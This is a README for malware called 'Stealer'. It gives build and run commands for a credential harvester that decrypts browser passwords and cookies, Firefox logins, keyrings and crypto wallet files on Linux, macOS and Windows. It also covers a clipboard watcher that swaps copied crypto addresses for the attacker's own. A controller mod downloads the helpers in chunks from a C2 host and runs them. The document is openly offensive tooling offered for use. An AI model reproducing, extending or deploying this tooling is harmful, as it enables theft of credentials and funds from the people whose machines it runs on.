# Stealer: harvester and clipboard swapper

Two native helpers plus a controller mod. They exist because Wasm cannot call
DPAPI, NSS, or the OS clipboard.

- `harvest` — browser credentials/cookies, Firefox logins, wallet files, and
  keyring listings, in one run, into a directory with a JSON manifest.
- `clipwatch` — polls the clipboard, recognises a crypto address, and replaces
  it with the configured address.
- `mods/stealer` — installs the helpers in chunks over HTTP and runs them.

## Build

```sh
cargo build --release -p stealer
# target/release/harvest, target/release/clipwatch
```

## Harvest

```sh
harvest --state "$STATE" --out "$OUT"
harvest --state "$STATE" --no-keyring --no-firefox   # smaller run
```

Output: `credentials.json`, `firefox.json`, `cookies.json`, `keyring.txt`,
`wallets/`, and `manifest.json`. The command prints a JSON summary. Every
artifact copy is capped at 16 MiB; wallets cap at 4000 files / 512 MiB; browser
credentials cap at `--limit` rows per source.

### What is covered

| Source | Linux | macOS | Windows |
|---|---|---|---|
| Chromium logins/cookies (`v10`) | peanuts / libsecret | Keychain Safe Storage, 1003 rounds | DPAPI + AES-256-GCM |
| Chromium `Local State` | copied | copied | copied |
| Firefox `logins.json` + `key4.db` | legacy 3DES and PBES2/AES-256 | same | same |
| Wallet files (Exodus, Electrum, Core, Monero, Solana, MetaMask/Phantom/Solflare LevelDB) | yes | yes | yes |
| Keyring | `secret-tool` dump | known Safe Storage services | `cmdkey /list` |

Honest limits:

- Windows `v20` app-bound values need elevation and COM; they are reported as
  locked, not silently skipped.
- A Firefox master password is reported as locked (only empty is tried).
- `cmdkey` lists targets, not plaintext credentials.
- Browsers must not be running exclusively locked; the helper copies the
  SQLite file (with WAL/SHM) before reading.
- macOS is code-reviewed, not run here; Windows does not build in this sandbox
  (no MSVC/mingw), so verify both on a VM.

## Clipboard watcher

```sh
clipwatch --state "$STATE" --set evm=0xOURS --set btc=bc1qOURS
clipwatch --state "$STATE" --once --backend file   # one poll
```

`clip.json`:

```json
{"interval_ms": 750, "addresses": {"evm": "0xOURS", "btc": "bc1qOURS"}}
```

Chains: `evm`, `btc`, `btc_legacy` (falls back to `btc`), `ltc`, `trx`, `xmr`,
`sol`, `doge`, `dash`, `zec`, `ada`, `bch`. The whole trimmed clipboard must be
exactly one address; base58 chains are checksum-validated, bech32 chains are
charset/prefix-matched only. Our own address copied again is a no-op, so the
watcher does not fight the user. Events append to `clipwatch.log`.

Backends, selected by `--backend` or auto-detected: `wl` (Wayland), `xclip`,
`xsel`, `pbcopy`, `powershell`, and `file` (`<state>/clipboard.txt`).

The watcher needs a session clipboard: an X/Wayland display, the macOS pasteboard,
or a Windows desktop. As a bare system service it cannot see a user's clipboard
unless it runs in that session; the PowerShell backend works from a service only
in the interactive session.

## Mod

`mods/stealer` actions:

```json
{"action":"install","dest":"/usr/local/bin/harvest","sha256":"...","chunks":["https://c2/a","https://c2/b"]}
{"action":"run","helper":"/usr/local/bin/harvest","args":["--state","/var/lib/agent-fleet"]}
{"action":"watch","helper":"/usr/local/bin/clipwatch","state":"/var/lib/agent-fleet"}
```

Each chunk is under 1 MiB; `install` concatenates with `sh`/`cmd`, verifies the
optional SHA-256, and chmods the result. `watch` performs one poll; schedule it
from the coordinator, or start `clipwatch` detached for continuous swapping.
